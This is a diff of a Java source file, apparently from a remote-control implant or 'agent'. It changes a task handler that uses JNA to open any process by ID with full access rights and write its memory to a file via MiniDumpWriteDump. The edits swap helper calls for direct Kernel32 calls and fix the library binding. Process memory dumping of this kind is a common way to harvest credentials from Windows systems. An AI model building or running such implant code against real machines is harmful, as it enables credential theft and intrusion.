@@ -1,13 +1,19 @@
 package agent;
 
-import com.sun.jna.Native;
 import com.sun.jna.platform.win32.COM.WbemcliUtil;
 import com.sun.jna.platform.win32.Ole32;
 import com.sun.jna.platform.win32.User32;
 import static com.sun.jna.platform.win32.Win32VK.*;
 import static com.sun.jna.platform.win32.WinUser.*;
+import com.sun.jna.platform.win32.*;
+import static com.sun.jna.platform.win32.WinNT.*;
 import com.sun.jna.platform.win32.Win32VK;
+import com.sun.jna.platform.win32.WinNT;
+import com.sun.jna.ptr.IntByReference;
+import com.sun.jna.win32.StdCall;
 import com.sun.jna.win32.StdCallLibrary;
+import com.sun.jna.Native;
+
 
 import java.time.LocalDateTime;
 import java.util.ArrayList;
@@ -19,10 +25,11 @@ import static com.sun.jna.platform.win32.WinUser.MAPVK_VSC_TO_VK_EX;
 
 public class windows {
 
-    static dbgApi32 winDbg = (dbgApi32) Native.loadLibrary("C:\\Windows\\System32\\dbghelp.dll",DbgApi.class);
+    static dbgApi32 winDbg = (dbgApi32) Native.loadLibrary("C:\\Windows\\System32\\dbghelp.dll",dbgApi32.class);
     interface dbgApi32 extends StdCallLibrary {
 	    public boolean MiniDumpWriteDump(WinNT.HANDLE hProcess, long processID, WinNT.HANDLE hFile, long DumpType, long ExceptionParam, long UserStreamParam, long CallBackParam);
     }
+
     
     public static Hashtable invokeMinidump(Hashtable args) {
         Hashtable taskOut = new Hashtable();
@@ -33,8 +40,9 @@ public class windows {
             int pid = Integer.parseInt(args.get("pid").toString());
             String dmpOut = args.get("outfile").toString();
             
-            WinNT.HANDLE hProc = Util.getProcHandle(pid);
-            WinNT.HANDLE hFile = Util.getFileHandle(dmpOut);
+            Kernel32 W32Kernel = Kernel32.INSTANCE;
+            WinNT.HANDLE hFile = W32Kernel.CreateFile(dmpOut, GENERIC_ALL, 0, null, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, null);
+            WinNT.HANDLE hProc = W32Kernel.OpenProcess(PROCESS_ALL_ACCESS, false, pid);
             
             boolean dmpResult = false; 
             
